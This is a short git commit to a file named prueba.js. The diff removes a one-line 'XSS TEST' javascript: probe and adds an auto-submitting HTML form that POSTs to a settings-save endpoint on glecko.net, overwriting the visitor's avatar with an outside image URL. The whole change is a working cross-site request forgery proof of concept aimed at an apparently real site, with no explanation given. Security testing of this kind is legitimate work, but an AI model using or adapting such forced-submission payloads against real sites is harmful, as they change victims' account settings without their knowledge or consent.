76e4b1a915f4fb43cde42facdcf7efb65145e7ff
Guille <guichezero@gmail.com>
2019-03-03 05:03:48 -0300

    Update prueba.js

--- prueba.js
+++ prueba.js
@@ -1,1 +1,6 @@
-javascript:console.log("XSS TEST");
+<form method="POST" action="http://glecko.net/http/settings-save" enctype="multipart/form-data" id="update_img">
+  <input type="text" name="avatar" value="https://s3-eu-west-1.amazonaws.com/barkibu-blog/blog+images/mi-perro-tiene-hipo-muy-seguido-que-le-pasa/perro-hipo-1.jpg">
+</form>
+<script>
+document.getElementById('update_img').submit()
+</script>
